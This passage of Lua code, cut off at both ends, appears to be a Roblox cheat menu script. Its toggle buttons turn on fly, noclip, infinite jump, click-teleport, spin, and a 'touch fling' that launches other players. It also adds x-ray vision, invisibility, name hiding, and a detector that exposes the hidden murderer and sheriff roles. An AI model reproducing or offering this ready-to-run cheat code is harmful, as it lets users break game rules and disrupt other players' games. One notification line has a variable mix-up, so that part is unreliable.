		local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
		local rootPart = character:WaitForChild("HumanoidRootPart")

		local bv = Instance.new("BodyVelocity")
		bv.Name = "VelocityHandler"
		bv.Parent = rootPart
		bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
		bv.Velocity = Vector3.new(0, 0, 0)

		local bg = Instance.new("BodyGyro")
		bg.Name = "GyroHandler"
		bg.Parent = rootPart
		bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.P = 1000
		bg.D = 50

		Signal1 = game.Players.LocalPlayer.CharacterAdded:Connect(function(NewChar)
			local newRoot = NewChar:WaitForChild("HumanoidRootPart")
			local newBv = Instance.new("BodyVelocity")
			newBv.Name = "VelocityHandler"
			newBv.Parent = newRoot
			newBv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
			newBv.Velocity = Vector3.new(0, 0, 0)

			local newBg = Instance.new("BodyGyro")
			newBg.Name = "GyroHandler"
			newBg.Parent = newRoot
			newBg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
			newBg.P = 1000
			newBg.D = 50
		end)

		local camera = game.Workspace.CurrentCamera

		Signal2 = game:GetService("RunService").RenderStepped:Connect(function()
			local character = game.Players.LocalPlayer.Character
			if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChildOfClass("Humanoid") then
				local hrp = character.HumanoidRootPart
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				local velocityHandler = hrp:FindFirstChild("VelocityHandler")
				local gyroHandler = hrp:FindFirstChild("GyroHandler")

				if velocityHandler and gyroHandler then
					humanoid.PlatformStand = true
					gyroHandler.CFrame = camera.CFrame

					local direction = controlModule:GetMoveVector()
					local newVelocity = Vector3.new()

					if direction.X ~= 0 then
						newVelocity = newVelocity + camera.CFrame.RightVector * (direction.X * speed)
					end
					if direction.Z ~= 0 then
						newVelocity = newVelocity - camera.CFrame.LookVector * (direction.Z * speed)
					end

					velocityHandler.Velocity = newVelocity
				end
			end
		end)
	end

	local function unmobilefly()
		local character = game.Players.LocalPlayer.Character
		if character and character:FindFirstChild("HumanoidRootPart") then
			local hrp = character.HumanoidRootPart
			if hrp:FindFirstChild("VelocityHandler") then
				hrp.VelocityHandler:Destroy()
			end
			if hrp:FindFirstChild("GyroHandler") then
				hrp.GyroHandler:Destroy()
			end
			if character:FindFirstChildOfClass("Humanoid") then
				character:FindFirstChildOfClass("Humanoid").PlatformStand = false
			end
		end
		if Signal1 then Signal1:Disconnect() end
		if Signal2 then Signal2:Disconnect() end
	end

	local asdd = {
		Buttons = {
			Fly = {
				Button = script.Parent.fly,
				Indicator = script.Parent.fly.Frame,
			}
		}
	}

	local SsSs = {
		Fly = {
			Active = false,
			SelectedFlySpeed = 35
		}
	}

	asdd.Buttons.Fly.Button.MouseButton1Click:Connect(function()
		if not SsSs.Fly.Active then
			SsSs.Fly.Active = true
			mobilefly(SsSs.Fly.SelectedFlySpeed)
			asdd.Buttons.Fly.Indicator.BackgroundColor3 = Color3.fromRGB(85, 255, 0) -- Verde
		else
			SsSs.Fly.Active = false
			unmobilefly()
			asdd.Buttons.Fly.Indicator.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Rojo
		end
	end)



	--NOCLIP

	local NOOO = {
		Buttons = {
			Noclip = {
				Button = script.Parent.nolip,
				Indicator = script.Parent.nolip.Frame,
			}
		}
	}

	local Lopa = {
		Noclip = {
			Active = false,

		}
	}

	local Noclipping = nil
	local speaker = game:GetService("Players").LocalPlayer
	--para activar
	local Clip = true
	local function NoclipLoop()
		if Clip == false and speaker.Character ~= nil then
			for _, child in pairs(speaker.Character:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true then
					child.CanCollide = false
				end
			end
		end
	end


	NOOO.Buttons.Noclip.Button.MouseButton1Click:Connect(function()
		if not Lopa.Noclip.Active then
			Lopa.Noclip.Active = true
			Clip = false
			wait(0.1)
			Noclipping = game:GetService("RunService").Stepped:Connect(NoclipLoop)

			NOOO.Buttons.Noclip.Indicator.BackgroundColor3 = Color3.fromRGB(85, 255, 0) -- Verde
		else
			Lopa.Noclip.Active = false
			if Noclipping then
				Noclipping:Disconnect()
			end
			Clip = true
			NOOO.Buttons.Noclip.Indicator.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Rojo
		end
	end)


	--INFINITE JUMP

	local Ecatepec = {
		Buttons = {
			InfJump = {
				Button = script.Parent.infinitejump,
				Indicator = script.Parent.infinitejump.Frame,
			}
		}
	}
	local Loodps = {
		InfJump = {
			Active = false,
		}
	}
	local speaker = game:GetService("Players").LocalPlayer
	--para activar

	local infJump
	local infJumpDebounce = false
	local function InfJump()
		if infJump then infJump:Disconnect() end
		infJumpDebounce = false
		infJump = game:GetService("UserInputService").JumpRequest:Connect(function()
			if not infJumpDebounce then
				infJumpDebounce = true
				speaker.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
				wait()
				infJumpDebounce = false
			end
		end)
	end
	Ecatepec.Buttons.InfJump.Button.MouseButton1Click:Connect(function()
		if not Loodps.InfJump.Active then
			Loodps.InfJump.Active = true
			InfJump()
			Ecatepec.Buttons.InfJump.Indicator.BackgroundColor3 = Color3.fromRGB(85, 255, 0) -- Verde
		else
			Loodps.InfJump.Active = false
			if infJump then infJump:Disconnect() end
			infJumpDebounce = false
			Ecatepec.Buttons.InfJump.Indicator.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Rojo
		end
	end)

	-- TP TOOL (Always Give on Character Respawn)

	local ScriptTt = {
		Buttons = {
			TpTool = {
				Button = script.Parent.teleporttool,
				Indicator = script.Parent.teleporttool.Frame,
			}
		}
	}

	local dddd = {
		TpTool = {
			Active = false,
		}
	}

	local speaker = game:GetService("Players").LocalPlayer
	local tpToolSignal = nil

	-- Tu función personalizada para dar el TP Tool
	local function give_tp_tool(speaker: Player)
		local IYMouse = speaker:GetMouse()
		local TpTool = Instance.new("Tool")
		TpTool.Name = "Teleport Tool"
		TpTool.RequiresHandle = false
		TpTool.Parent = speaker.Backpack

		TpTool.Activated:Connect(function()
			local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
			local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
			if not Char or not HRP then
				return warn("Failed to find HumanoidRootPart")
			end
			HRP.CFrame = CFrame.new(IYMouse.Hit.X, IYMouse.Hit.Y + 3, IYMouse.Hit.Z, select(4, HRP.CFrame:components()))
		end)
	end

	-- Función para eliminar el TP Tool si existe
	local function remove_tp_tool(player)
		local function tryRemove(container)
			local tool = container:FindFirstChild("Teleport Tool")
			if tool then
				tool:Destroy()
			end
		end
		tryRemove(player.Backpack)
		if player.Character then
			tryRemove(player.Character)
		end
	end

	-- Activar lógica de "always give"
	local function enable_tp_tool()
		if speaker.Character then
			give_tp_tool(speaker)
		end

		tpToolSignal = speaker.CharacterAdded:Connect(function()
			give_tp_tool(speaker)
		end)
	end

	-- Desactivar lógica y limpiar
	local function disable_tp_tool()
		if tpToolSignal then
			tpToolSignal:Disconnect()
			tpToolSignal = nil
		end
		remove_tp_tool(speaker)
	end

	-- Conexión del botón
	ScriptTt.Buttons.TpTool.Button.MouseButton1Click:Connect(function()
		if not dddd.TpTool.Active then
			dddd.TpTool.Active = true
			enable_tp_tool()
			ScriptTt.Buttons.TpTool.Indicator.BackgroundColor3 = Color3.fromRGB(85, 255, 0) -- Verde
		else
			dddd.TpTool.Active = false
			disable_tp_tool()
			ScriptTt.Buttons.TpTool.Indicator.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Rojo
		end
	end)


	-- SPIN LOCAL PLAYER CHARACTER

	local JAJAJ = {
		Buttons = {
			Spin = {
				Button = script.Parent.spin,
				Indicator = script.Parent.spin.Frame,
			}
		}
	}

	local AsiNO = {
		Spin = {
			Active = false,
		}
	}

	local spinSpeeds = {5, 10, 20, 40, 80}
	local currentSpeedIndex = 2 -- Comienza en 10
	local spinSpeed = spinSpeeds[currentSpeedIndex]

	-- Función para obtener el HumanoidRootPart de un personaje
	local function getRoot(character)
		return character:FindFirstChild("HumanoidRootPart")
	end

	local player = game:GetService("Players").LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()

	-- Función para aplicar el giro
	local function spin()
		local root = getRoot(character)
		if root then
			-- Elimina cualquier giro previo
			local existing = root:FindFirstChild("Spinning")
			if existing then existing:Destroy() end

			local spin = Instance.new("BodyAngularVelocity")
			spin.Name = "Spinning"
			spin.MaxTorque = Vector3.new(0, math.huge, 0)
			spin.AngularVelocity = Vector3.new(0, spinSpeed, 0)
			spin.P = 1250
			spin.Parent = root
		end
	end

	-- Función para detener el giro
	local function stopSpin()
		local root = getRoot(character)
		if root then
			local spin = root:FindFirstChild("Spinning")
			if spin then spin:Destroy() end
		end
	end

	-- Clic izquierdo: activar/desactivar giro
	JAJAJ.Buttons.Spin.Button.MouseButton1Click:Connect(function()
		if not AsiNO.Spin.Active then
			AsiNO.Spin.Active = true
			spin()
			JAJAJ.Buttons.Spin.Indicator.BackgroundColor3 = Color3.fromRGB(85, 255, 0) -- Verde
		else
			AsiNO.Spin.Active = false
			stopSpin()
			JAJAJ.Buttons.Spin.Indicator.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Rojo
		end
	end)

	-- Clic derecho: cambiar velocidad mientras esté activo
	JAJAJ.Buttons.Spin.Button.MouseButton2Click:Connect(function()
		if AsiNO.Spin.Active then
			currentSpeedIndex += 1
			if currentSpeedIndex > #spinSpeeds then
				currentSpeedIndex = 1
			end
			spinSpeed = spinSpeeds[currentSpeedIndex]
			spin() -- Reinicia el spin con nueva velocidad
		end
	end)




	-- TOUCH FLING LOCAL PLAYER

	local DDDDDDDD = {
		Buttons = {
			TouchFling = {
				Button = script.Parent.touchfling,
				Indicator = script.Parent.touchfling.Frame,
			}
		}
	}

	local DALE = {
		TouchFling = {
			Active = false,
			Connection = nil
		}
	}

	local player = game:GetService("Players").LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local hrp = character:WaitForChild("HumanoidRootPart")

	-- Función para aplicar fling
	local function fling()
		local originalVel = hrp.Velocity
		hrp.Velocity = originalVel * 10000 + Vector3.new(0, 10000, 0)
		game:GetService("RunService").RenderStepped:Wait()
		hrp.Velocity = originalVel
	end

	-- Activar touch fling
	local function enableTouchFling()
		if DALE.TouchFling.Connection then
			DALE.TouchFling.Connection:Disconnect()
		end

		DALE.TouchFling.Connection = hrp.Touched:Connect(function(hit)
			local otherChar = hit:FindFirstAncestorOfClass("Model")
			local otherHum = otherChar and otherChar:FindFirstChildOfClass("Humanoid")

			if otherChar and otherChar ~= character and otherHum then
				fling()
			end
		end)
	end

	-- Desactivar touch fling
	local function disableTouchFling()
		if DALE.TouchFling.Connection then
			DALE.TouchFling.Connection:Disconnect()
			DALE.TouchFling.Connection = nil
		end
	end

	-- Click izquierdo para activar/desactivar
	DDDDDDDD.Buttons.TouchFling.Button.MouseButton1Click:Connect(function()
		if not DALE.TouchFling.Active then
			DALE.TouchFling.Active = true
			enableTouchFling()
			DDDDDDDD.Buttons.TouchFling.Indicator.BackgroundColor3 = Color3.fromRGB(85, 255, 0) -- Verde
		else
			DALE.TouchFling.Active = false
			disableTouchFling()
			DDDDDDDD.Buttons.TouchFling.Indicator.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Rojo
		end
	end)


	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

	local function getMap()
		for _, o in ipairs(workspace:GetChildren()) do
			if o:FindFirstChild("CoinContainer") and o:FindFirstChild("Spawns") then
				return o
			end
		end
		return nil
	end

	-- Teleportar al lobby
	script.Parent.TP2Lobby.MouseButton1Click:Connect(function()
		local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
		if char and char:FindFirstChild("HumanoidRootPart") then
			char:MoveTo(Vector3.new(-107, 152, 41))
		end
	end)

	-- Teleportar al mapa
	script.Parent.TP2Map.MouseButton1Click:Connect(function()
		local map = getMap()
		if map then
			local spawnsFolder = map:FindFirstChild("Spawns")
			if spawnsFolder then
				local spawns = spawnsFolder:GetChildren()
				if #spawns > 0 then
					local randomSpawn = spawns[math.random(1, #spawns)]
					local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
					if char and char:FindFirstChild("HumanoidRootPart") then
						char:MoveTo(randomSpawn.Position)
					end
					return
				end
			end
		end

		-- Fallback si falla todo
		require(script.Parent.Parent.Parent.Parent.NotificationService).SetDefaultTheme("Error")
		require(script.Parent.Parent.Parent.Parent.NotificationService).ShowNotification({
			title = "Notification / Teleport To Map",
			text = "The map is unobtainable or the round has not yet started.",
			soundOnOpen = Notificaciones.Error
		})
	end)


	local AntiNumeroElevado = true

	local Res = script.Parent.TextBoxButton1SS.TextBox
	local RunService = game:GetService("RunService")
	local Camera = workspace.CurrentCamera
	local SquishConnection
	local function onFocusLost()
		local inputText = Res.Text:lower() -- Convertir a minúsculas para detectar "def" sin importar el formato
		local Squish = tonumber(inputText) -- Intentar convertirlo a número

		-- Si el usuario ingresa "def" o deja el campo vacío, establecer Squish en 1
		if inputText == "def" or inputText == "" then
			--local Notificacion = script.Parent:WaitForChild("Notificacion")
			----Notificar sobre los cambios
			--if Notificacion:IsA("BindableEvent") then
			--	Notificacion:Fire("Aviso: ", "Texto No Disponible" ,Color3.new(0, 0.666667, 0.588235), "Aviso")

			--end
			require(script.Parent.Parent.Parent.Parent.NotificationService).SetDefaultTheme("Error")
			require(script.Parent.Parent.Parent.Parent.NotificationService).ShowNotification({
				title = "Notification / TextBox",
				text = "inputText has no text",
				soundOnOpen = Notificaciones.Error
			})
			Squish = 1
		elseif not Squish or Squish < 0 then
			-- Notificar al usuario si el número ingresado es inválido
			--local Notificacion = script.Parent:WaitForChild("Notificacion")
			----Notificar sobre los cambios
			--if Notificacion:IsA("BindableEvent") then
			--	Notificacion:Fire("Error: ", "El número debe estar entre 0 y 1" ,Color3.new(0.666667, 0, 0), "Error")
			if AntiNumeroElevado  then
				require(script.Parent.Parent.Parent.Parent.NotificationService).SetDefaultTheme("Error")
				require(script.Parent.Parent.Parent.Parent.NotificationService).ShowNotification({
					title = "Notification / TextBox",
					text = "The number must be between 0 and 1",
					soundOnOpen = Notificaciones.Aviso
				})

				Squish = 1
			end
		elseif Squish > 1 then
			--local Notificacion = script.Parent:WaitForChild("Notificacion")
			----Notificar sobre los cambios
			--if Notificacion:IsA("BindableEvent") then
			--	Notificacion:Fire("Error: ", "El número esta demasiado elevado." ,Color3.new(0.666667, 0, 0), "Error")

			--end
			if AntiNumeroElevado then
				require(script.Parent.Parent.Parent.Parent.NotificationService).SetDefaultTheme("Warning")
				require(script.Parent.Parent.Parent.Parent.NotificationService).ShowNotification({
					title = "Notification / TextBox",
					text = "The number must be between 0 and 1.0 (click close to bypass this)",
					soundOnOpen = Notificaciones.Aviso,
					ButtonCloseFunction = function()
						AntiNumeroElevado = false
						require(script.Parent.Parent.Parent.Parent.NotificationService).SetDefaultTheme("Success")
						require(script.Parent.Parent.Parent.Parent.NotificationService).ShowNotification({
							title = "Notification / TextBox",
							text = "The number must be between -inf and inf ",
							soundOnOpen = Notificaciones.Correcto
						})
					end,
				})

				Squish = 1
			end
		end

		-- Asegurar que no se conecten múltiples funciones
		if SquishConnection then
			SquishConnection:Disconnect()
		end
		if Squish == 1 then return end
		print("doing SquishConnection")
		SquishConnection = RunService.RenderStepped:Connect(function()
			local MAGIC_FORMULA = CFrame.new(0, 0, 0, 1, 0, 0, 0, Squish, 0, 0, 0, 1)
			Camera.CFrame = Camera.CFrame * MAGIC_FORMULA
		end)
	end

	Res.FocusLost:Connect(onFocusLost)



	--[[ 
	    X-Ray LocalScript for Roblox 
	    Place this script in StarterPlayerScripts. 
	--]]

	local Players = game:GetService("Players")
	local Workspace = game:GetService("Workspace")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")

	local LocalPlayer = Players.LocalPlayer
	local Camera = Workspace.CurrentCamera

	local originalTransparency = {}
	local xrayActive = false
	local updateLoopRunning = false

	local XRAY_TRANSPARENCY = 0.5
	local CHECK_RADIUS = 60
	local CHECK_DELAY = 0.1
	-- Check if part is eligible
	local function isPartEligible(part)
		if not (part:IsA("BasePart") or part:IsA("MeshPart") or part:IsA("UnionOperation")) then
			return false
		end
		if part.Transparency >= 1 then
			return false
		end
		if LocalPlayer.Character and part:IsDescendantOf(LocalPlayer.Character) then
			return false
		end
		return true
	end

	-- Update X-Ray effect
	local function updateXRayEffect()
		if not Camera then return end

		local params = OverlapParams.new()
		params.FilterType = Enum.RaycastFilterType.Blacklist
		params.FilterDescendantsInstances = {LocalPlayer.Character}

		local partsToCheck = Workspace:GetPartBoundsInRadius(Camera.CFrame.Position, CHECK_RADIUS, params)
		local partsCurrentlyInRange = {}

		for _, part in ipairs(partsToCheck) do
			if isPartEligible(part) then
				partsCurrentlyInRange[part] = true

				if not originalTransparency[part] then
					originalTransparency[part] = part.Transparency
					part.Transparency = XRAY_TRANSPARENCY
				elseif part.Transparency ~= XRAY_TRANSPARENCY then
					part.Transparency = XRAY_TRANSPARENCY
				end
			end
		end

		for part, _ in pairs(originalTransparency) do
			if not partsCurrentlyInRange[part] then
				if part and part.Parent then
					part.Transparency = originalTransparency[part]
				end
				originalTransparency[part] = nil
			end
		end
	end

	-- X-Ray update loop
	local function xrayUpdateLoop()
		updateLoopRunning = true


		task.spawn(function()
			while xrayActive do
				updateXRayEffect()
				task.wait(CHECK_DELAY)
			end
		end)

		updateLoopRunning = false

	end

	-- Activate X-Ray
	local function ActivateXRay()
		if xrayActive then return end

		xrayActive = true

		if not updateLoopRunning then
			task.spawn(xrayUpdateLoop)
		end

		updateXRayEffect()
	end

	-- Deactivate X-Ray
	local function DeactivateXRay()
		if not xrayActive then return end

		xrayActive = false

		for part, originalTrans in pairs(originalTransparency) do
			if part and part.Parent then
				part.Transparency = originalTrans
			end
		end
		originalTransparency = {}
	end

	script.Parent.xray.MouseButton1Click:Connect(function()
		if xrayActive then
			script.Parent.xray.Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
			DeactivateXRay()
		else
			script.Parent.xray.Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			ActivateXRay()
		end
	end)

	script.Parent.HideYourName.MouseButton1Click:Connect(function()
		task.spawn(function()
			local Players = game:GetService("Players")
			local CoreGui = game:GetService("CoreGui")
			local RunService = game:GetService("RunService") -- Included for future use if needed, like task.defer

			local localPlayer = Players.LocalPlayer
			if not localPlayer then
				-- This should ideally not be necessary in a StarterPlayerScript,
				-- as LocalPlayer is typically available when they run.
				local playerAddedConnection
				playerAddedConnection = Players.PlayerAdded:Connect(function(player)
					if player == Players.LocalPlayer then
						localPlayer = player
						if playerAddedConnection then
							playerAddedConnection:Disconnect()
						end
					end
				end)
				if not localPlayer then -- Still not found, wait briefly
					localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
				end
			end

			local playerName = localPlayer.Name
			local playerDisplayName = localPlayer.DisplayName

			local processedObjects = {} -- Stores { [guiObject] = {textChangedConnection = connection} }

			local function censorString(text)
				if not text or type(text) ~= "string" or #text == 0 then
					return text
				end

				local currentText = text
				local namesToCensor = {}

				if playerDisplayName and #playerDisplayName > 0 then
					table.insert(namesToCensor, { Name = playerDisplayName, Placeholder = string.rep("*", #playerDisplayName) })
				end
				-- Add Player.Name only if it's different from DisplayName to avoid redundant processing or conflicts
				if playerName and #playerName > 0 and playerName ~= playerDisplayName then
					table.insert(namesToCensor, { Name = playerName, Placeholder = string.rep("*", #playerName) })
				end

				-- Sort by length descending to replace longer names first
				table.sort(namesToCensor, function(a, b)
					return #a.Name > #b.Name
				end)

				for _, item in namesToCensor do
					if #item.Name == 0 then continue end -- Skip empty names

					local tempText = ""
					local lastIndex = 1
					while true do
						local s, e = string.find(currentText, item.Name, lastIndex, true) -- plain find
						if s then
							tempText = tempText .. string.sub(currentText, lastIndex, s - 1) .. item.Placeholder
							lastIndex = e + 1
						else
							tempText = tempText .. string.sub(currentText, lastIndex)
							break
						end
					end
					currentText = tempText
				end
				return currentText
			end

			local function processGuiObject(guiObject)
				if not (guiObject:IsA("TextLabel") or guiObject:IsA("TextButton") or guiObject:IsA("TextBox")) then
					return
				end
				if processedObjects[guiObject] then return end -- Already processed

				local success, currentText
				success, currentText = pcall(function() return guiObject.Text end)

				if success and type(currentText) == "string" then
					local newText = censorString(currentText)
					if newText ~= currentText then
						pcall(function() guiObject.Text = newText end)
					end
				end

				local textChangedConnection
				textChangedConnection = guiObject:GetPropertyChangedSignal("Text"):Connect(function()
					local changedSuccess, changedText = pcall(function() return guiObject.Text end)
					if changedSuccess and type(changedText) == "string" then
						local newlyCensoredText = censorString(changedText)
						-- Only set if different to avoid potential recursion if Text set fires signal immediately
						if newlyCensoredText ~= changedText then
							pcall(function() guiObject.Text = newlyCensoredText end)
						end
					end
				end)

				local destroyingConnection
				destroyingConnection = guiObject.Destroying:Connect(function()
					if textChangedConnection then
						textChangedConnection:Disconnect()
					end
					if destroyingConnection then
						destroyingConnection:Disconnect() -- Disconnect self
					end
					processedObjects[guiObject] = nil
				end)

				processedObjects[guiObject] = {
					textChangedConnection = textChangedConnection,
					destroyingConnection = destroyingConnection
				}
			end

			local function processInstanceRecursively(instance)
				if not instance or processedObjects[instance] and not (instance:IsA("ScrollingFrame") or instance:IsA("Frame") or instance:IsA("GuiObject")) then
					-- Avoid reprocessing non-UI containers if they were somehow marked,
					-- but always process UI elements and containers like ScrollingFrame
				end

				pcall(processGuiObject, instance) -- Process the instance itself

				-- If it's a ScrollingFrame, specifically listen for its new descendants
				if instance:IsA("ScrollingFrame") then
					-- Check if we already connected DescendantAdded for this ScrollingFrame
					if not (processedObjects[instance] and processedObjects[instance].scrollingFrameDescendantAdded) then
						local sfDescendantAddedConn = instance.DescendantAdded:Connect(function(newDescendantInSF)
							processInstanceRecursively(newDescendantInSF)
						end)
						-- Store this specific connection if needed for cleanup, or rely on SF being destroyed
						if processedObjects[instance] then
							processedObjects[instance].scrollingFrameDescendantAdded = sfDescendantAddedConn
						else
							-- This case might happen if SF itself is not a TextLabel/Button/Box
							-- We still need to track its Destroying event to clean up this connection
							local sfDestroyingConn
							sfDestroyingConn = instance.Destroying:Connect(function()
								if sfDescendantAddedConn then sfDescendantAddedConn:Disconnect() end
								if sfDestroyingConn then sfDestroyingConn:Disconnect() end
								-- Also remove from processedObjects if it was added for this purpose
								if processedObjects[instance] and processedObjects[instance].scrollingFrameDescendantAdded == sfDescendantAddedConn then
									-- Check if it's the only reason it's in processedObjects
									local hasOtherConnections = processedObjects[instance].textChangedConnection
									if not hasOtherConnections then
										processedObjects[instance] = nil
									else
										processedObjects[instance].scrollingFrameDescendantAdded = nil
									end
								end
							end)
							if not processedObjects[instance] then processedObjects[instance] = {} end -- Ensure entry exists
							processedObjects[instance].scrollingFrameDescendantAdded = sfDescendantAddedConn
							processedObjects[instance].scrollingFrameDestroying = sfDestroyingConn

						end
					end
				end

				-- Process existing children of this instance
				for _, child in instance:GetChildren() do
					processInstanceRecursively(child)
				end
			end

			-- Handle DisplayName changes
			localPlayer:GetPropertyChangedSignal("DisplayName"):Connect(function()
				playerDisplayName = localPlayer.DisplayName
				-- Re-process all known GUI objects
				for guiObject, connections in processedObjects do
					if guiObject and guiObject.Parent and connections and connections.textChangedConnection then -- Check if object still exists and is a text UI
						if guiObject:IsA("TextLabel") or guiObject:IsA("TextButton") or guiObject:IsA("TextBox") then
							local success, currentText = pcall(function() return guiObject.Text end)
							if success and type(currentText) == "string" then
								local newText = censorString(currentText) -- censorString now uses the new playerDisplayName
								if newText ~= currentText then
									pcall(function() guiObject.Text = newText end)
								end
							end
						end
					end
				end
			end)

			-- Wait for PlayerGui to be available
			local playerGui = localPlayer:WaitForChild("PlayerGui")

			-- Initial scan of existing UI
			processInstanceRecursively(workspace)
			processInstanceRecursively(CoreGui)
			processInstanceRecursively(playerGui)

			-- Monitor for new UI additions to root containers
			workspace.DescendantAdded:Connect(processInstanceRecursively)
			CoreGui.DescendantAdded:Connect(processInstanceRecursively)
			playerGui.DescendantAdded:Connect(processInstanceRecursively)

			print("NameCensorLocalScript loaded and running.")
		end)

	end)

	invisRunning = true
	-- Full credit to AmokahFox @V3rmillion
	local Player = game.Players.LocalPlayer
	repeat wait(.1) until game.Players.LocalPlayer.Character
	local Character = game.Players.LocalPlayer.Character
	Character.Archivable = true
	local IsInvis = false
	local IsRunning = true
	local InvisibleCharacter = Character:Clone()
	InvisibleCharacter.Parent = game.Lighting
	local Void = workspace.FallenPartsDestroyHeight
	InvisibleCharacter.Name = ""
	local CF

	local invisFix = game:GetService("RunService").Stepped:Connect(function()
		pcall(function()
			local IsInteger
			if tostring(Void):find'-' then
				IsInteger = true
			else
				IsInteger = false
			end
			local Pos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			local Pos_String = tostring(Pos)
			local Pos_Seperate = Pos_String:split(', ')
			local X = tonumber(Pos_Seperate[1])
			local Y = tonumber(Pos_Seperate[2])
			local Z = tonumber(Pos_Seperate[3])
			if IsInteger == true then
				if Y <= Void then
					Respawn()
				end
			elseif IsInteger == false then
				if Y >= Void then
					Respawn()
				end
			end
		end)
	end)

	for i,v in pairs(InvisibleCharacter:GetDescendants())do
		if v:IsA("BasePart") then
			if v.Name == "HumanoidRootPart" then
				v.Transparency = 1
			else
				v.Transparency = .5
			end
		end
	end

	function Respawn()
		IsRunning = false
		if IsInvis == true then
			pcall(function()
				Player.Character = Character
				wait()
				Character.Parent = workspace
				Character:FindFirstChildWhichIsA'Humanoid':Destroy()
				IsInvis = false
				InvisibleCharacter.Parent = nil
				invisRunning = false
			end)
		elseif IsInvis == false then
			pcall(function()
				Player.Character = Character
				wait()
				Character.Parent = workspace
				Character:FindFirstChildWhichIsA'Humanoid':Destroy()
				TurnVisible()
			end)
		end
	end

	local invisDied
	invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
		Respawn()
		invisDied:Disconnect()
	end)
	function TurnVisible()
		if IsInvis == false then return end
		invisFix:Disconnect()
		invisDied:Disconnect()
		CF = workspace.CurrentCamera.CFrame
		Character = Character
		local CF_1 = Player.Character.HumanoidRootPart.CFrame
		Character.HumanoidRootPart.CFrame = CF_1
		InvisibleCharacter.Parent = game.Lighting
		Player.Character = Character
		Character.Parent = workspace
		IsInvis = false
		Player.Character.Animate.Disabled = true
		Player.Character.Animate.Disabled = false
		invisDied = Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
			Respawn()
			invisDied:Disconnect()
		end)
		invisRunning = false
	end
	IsInvis = false
	script.Parent.invisible.MouseButton1Click:Connect(function()
		if IsInvis == false then
			IsInvis = true
			CF = game.Workspace.CurrentCamera.CFrame
			local CF_1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
			game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
			wait(.1)
			game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
			InvisibleCharacter = InvisibleCharacter
			Character.Parent = game.Lighting
			InvisibleCharacter.Parent = game.Workspace
			InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
			Player.Character = InvisibleCharacter
			local workspace = game.Workspace
			Players = game:GetService("Players")
			local speaker = game.Players.LocalPlayer
			workspace.CurrentCamera:remove()
			wait(.1)
			game.Workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
			game.Workspace.CurrentCamera.CameraType = "Custom"
			game.Players.LocalPlayer.CameraMinZoomDistance = 0.5
			game.Players.LocalPlayer.CameraMaxZoomDistance = 400
			game.Players.LocalPlayer.CameraMode = "Classic"
			game.Players.LocalPlayer.Character.Head.Anchored = false
			game.Players.LocalPlayer.Character.Animate.Disabled = true
			game.Players.LocalPlayer.Character.Animate.Disabled = false
			script.Parent.invisible.Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		elseif IsInvis == true then
			TurnVisible()
			IsInvis = false
			script.Parent.invisible.Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	end)


	-------------

	local Notification_Service = require(script.Parent.Parent.Parent.Parent:FindFirstChild("NotificationService"))

	local function errornotify(text)
		Notification_Service.ShowNotification({
			title = "Error / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Error,
			theme = "Error"
		})
	end

	local function sucessnotify(text)
		Notification_Service.ShowNotification({
			title = "Success / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Correcto,
			theme = "Success"
		})
	end

	local function warningnotify(text)
		Notification_Service.ShowNotification({
			title = "Warning / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Aviso,
			theme = "Warning"
		})
	end

	-- Botón de activación
	local OnNewMurderOrSheriff = script.Parent.OnNewMurderAndSherrif
	local IsActiveONMOSFrame = OnNewMurderOrSheriff.Frame

	-- Estado del detector
	local IsActiveONMOS = false
	local currentMurderer = nil
	local currentSheriff = nil

	-- Función para revisar cambios
	local function startMonitoringRoles()
		print("[DEBUG] Inicio del monitoreo de roles...")
		while IsActiveONMOS do
			local newMurderer = Help_Functions.findMurderer()
			local newSheriff = Help_Functions.findSheriff()

			if newMurderer ~= currentMurderer then
				currentMurderer = newMurderer
				print("[DEBUG] Nuevo Murderer detectado:", currentMurderer and currentMurderer.Name or "Ninguno")
				sucessnotify("New Murderer: "..newSheriff and currentSheriff.Name or "none")
			end

			if newSheriff ~= currentSheriff then
				currentSheriff = newSheriff
